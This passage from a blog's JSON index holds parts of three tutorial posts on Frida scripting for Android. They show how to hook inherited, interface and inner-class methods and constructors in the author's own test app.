var Square = Java.use(\u0026#34;com.blog.testfrida.inheritance.Square\u0026#34;); var squareInstance = Square.$new(5); console.log(\u0026#34;square perimeter: \u0026#34; + TestInheritance.getPerimeter(squareInstance)); In Frida you can work with inherited classes as you would do directly in Java, as the methods automatically casts the object to the right type.\npublic static double getPerimeter(Figure figure) { return figure.perimeter(); } When we retrieve the value from Frida and check the class:\nvar figureInstance = TestInheritance.getCircle(); console.log(figureInstance.$className); we get that the className is \u0026lsquo;com.blog.testfrida.inheritance.Circle\u0026rsquo;. But when we try to use a method that is in the Circle only (getCircleName) we get that the method is undefined. This means the object is casted to a Figure:\nvar figureInstance = TestInheritance.getCircle(); if (figureInstance.getCircleName === undefined) { console.log(\u0026#34;Instance is figure, the getCircleName does not exist.\u0026#34;); } else { console.log(figureInstance.getCircleName()); } To access the circle method, we should cast it:\ncircleInstance = Java.cast(figureInstance,Circle); console.log(circleInstance.getCircleName()); Sometimes in Java we want to reuse some code of a parent class, but we want to add some component that exists or makes sense only in the subclass. As an example a constructor that sets all the private attributes to a default value. As an example, in the Android application I created two classes. One is SuperClass, and the other SubClass. In the SuperClass we have the \u0026ldquo;superValue\u0026rdquo;. In the constructor we set its value to 10:\npublic SuperClass() { superValue = 10; } The SubClass has two attributes that are being set in the constructor.\npublic SubClass() { super(); subValue = 10; setValue = 10; } To avoid copy the SuperClass content to the SubClass constructor (in some cases it isn\u0026rsquo;t even possible), Java has a \u0026ldquo;super\u0026rdquo; attribute that points to the SuperClass object. We can use it to call the SuperClass method, so then when we use the SubClass method to get the superValue, we\u0026rsquo;ll see that it was set to 10.\n//In this case I rewrote a new function that has a super implementation SubClass.$init.implementation = function () { var superInheritance = Java.cast(this,SuperClass); superInheritance.$init(); this.subValue.value = 25; } There a couple of things to tell about this example. When you want to change or intercept a constructor, you need to modify the $init function in Frida. To call the super class, you need to cast the \u0026ldquo;this\u0026rdquo; variable (reference to itself).\nNext: Interfaces\n","permalink":"https://cmrodriguez.me/blog/inheritance/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (8) - Inheritance"},{"categories":["Frida","Android"],"contents":"An interface is a reference type in Java. It is similar to class. It is a collection of abstract methods. A class implements an interface, thereby inheriting the abstract methods of the interface.\nAlong with abstract methods, an interface may also contain constants, default methods, static methods, and nested types. Method bodies exist only for default methods and static methods.\nAn interface is different from a class in several ways:\nYou cannot instantiate an interface. An interface does not contain any constructors. All of the methods in an interface are abstract. An interface cannot contain instance fields. The only fields that can appear in an interface must be declared both static and final. An interface is not extended by a class; it is implemented by a class. To test this functionality I\u0026rsquo;ve created in the application an interface called MyInterface, and a class that implements the interface called MyInterfaceClass.\nIn order to get the interface representation in Frida we use the same code as we would use for a class:\nMyInterface = Java.use(\u0026#34;com.blog.testfrida.interfaces.MyInterface\u0026#34;); We can\u0026rsquo;t intercept or modify the abstract methods exposed by the interface. As an example I tried to implement the getMessage method from the interface in the following way:\nMyInterface.getMessage.implementation = function () { console.log(\u0026#34;it gets into the getMessage\u0026#34;); return String.$new(\u0026#34;it works\u0026#34;); } When we call the getMessage from the implementation of the getMessage method in the MyInterfaceClass, the console.log is not triggered. If we want to change the implementation, we have to do it in each class the abstract method is implemented. In this case we did it on the only class implementing MyInterface:\nvar MyInterfaceClass = Java.use(\u0026#34;com.blog.testfrida.interfaces.MyInterfaceClass\u0026#34;); MyInterfaceClass.getMessage.implementation = function () { console.log(\u0026#34;it gets into the getMessage\u0026#34;); return String.$new(\u0026#34;it works\u0026#34;); } Note that we can\u0026rsquo;t instantiate an interface, it will throw the following error:\nError: no supported overloads at makeConstructor (frida/node_modules/frida-java-bridge/lib/class-factory.js:478) ... at /examples.js:434 When we get an instance of a class that implements an interface, we can call the interfaces\u0026rsquo; methods, but Frida will end up calling the classes implementations as in the following examples:\n//we get an instance of Interface and call the getMessage var interfaceInstance = MyInterfaceClass.getNewInstance(); //internally it calls the getMessage from the MyInterfaceClass console.log(interfaceInstance.getMessage()); //this does not call the default interface, it calls the class one (even when it is //casted as a MyInterface interface) console.log(interfaceInstance.getInt()); Next: Inner classes\n","permalink":"https://cmrodriguez.me/blog/interfaces/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (8) - Interfaces"},{"categories":["Frida","Android"],"contents":"In this blogpost I will show how to consume inner classes in Java from Frida. In Java nested classes are classes that are defined inside another class. The purpose of a nested class is to clearly group the nested class with its surrounding class, signaling that these two classes are to be used together. Or perhaps that the nested class is only to be used from inside its enclosing (owning) class.\nAs an example the following are nested classes:\npublic class OuterClass { ... class InnerClass { public char getInnerChar() { return \u0026#39;i\u0026#39;; } } } In order to get with Frida to the InnerClass we have to use the following code:\nvar InnerClass = Java.use(\u0026#34;com.blog.testfrida.innerclasses.OuterClass$InnerClass\u0026#34;); var OuterClass = Java.use(\u0026#34;com.blog.testfrida.innerclasses.OuterClass\u0026#34;); If the inner class is instantiated as a static public class, it can be used in a code as a common class (besides the OuterClass, that always has access to the InnerClass). But if the class is configured as shown in the example the following code will generate an error:\nvar instanceInnerClass = InnerClass.$new(); It will fail because the InnerClass will have by default a constructor that receives an instance from the OuterClass (as the declaration of the class is not static). So to create an instance we need to execute the following code in Frida:\nvar instanceOuterClass = OuterClass.$new(); var instanceInnerClass = InnerClass.$new(instanceOuterClass); So the reference to the OuterClass is stored in an internal attribute. In order to ge acces to it from a reimplementation of a method we can use the this$0 reference as in the following example:\nInnerClass.getInnerChar.implementation = function () { //reference to outer class, and call a method console.log(this.this$0.value.getIdOuterClass()); //reference to outer class, and call an attribute console.log(this.this$0.value.val.value); return \u0026#39;j\u0026#39;; } There is another type of innerclass called Anonymous Inner Class. It is an inner class without a name and for which only a single object is created. An anonymous inner class can be useful when making an instance of an object with certain “extras” such as overloading methods of a class or interface, without having to actually subclass a class. The following is an example of an anonymous inner class:\npublic class AnonymousInnerClass { public String getMessageAnonymous() { InnerInterface inner = new InnerInterface() { @Override public String getMessage() { return \u0026#34;getMessage\u0026#34;; } }; return inner.getMessage(); } } Even when the anonmyous class seems not to have a name, Java internally at compile type generates a common nested class with a numeric name (starting in 1). In order to abstract ourselves from the name Java assigns to the class we can use the following code in Frida:\nJava.enumerateLoadedClasses( { \u0026#34;onMatch\u0026#34;: function(className){ if(className.includes(\u0026#34;com.blog.testfrida.innerclasses.AnonymousInnerClass$\u0026#34;)){ console.log(className); } }, \u0026#34;onComplete\u0026#34;:function(){} } ); This code snippet lists all the classes loaded in the VM by name. As we know that the anonymous class is created as an inner class, we know that the full classpath will be $. So we filter all the classes that starts with that name. As a caveat, the first time I listed all the inner classes from AnonymousInnerClass, I could find none. After some minutes of analyzing the reason I realized that it has not been loaded by a ClassLoader yet, as it was never used in the application. So I forced the VM to load it basically instantiating it:\nvar AnonymousInnerClass = Java.use(\u0026#34;com.blog.testfrida.innerclasses.AnonymousInnerClass\u0026#34;); var instanceAnonymous = AnonymousInnerClass.$new(); And after that I could achieve the dynamic instrumentation of the anonymous inner class:\nJava.enumerateLoadedClasses( { \u0026#34;onMatch\u0026#34;: function(className){ if(className.includes(\u0026#34;com.blog.testfrida.innerclasses.AnonymousInnerClass\u0026#34;)){ if (className.includes(\u0026#34;$\u0026#34;)) { var anonymousClass = Java.use(className); anonymousClass.getMessage.implementation = function () { return \u0026#34;it works well :)\u0026#34;; } } } }, \u0026#34;onComplete\u0026#34;:function(){} } ); Next: Exception handling\n","permalink":"https://cmrodriguez.me/blog/inner-classes/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (9) - Inner Classes"}]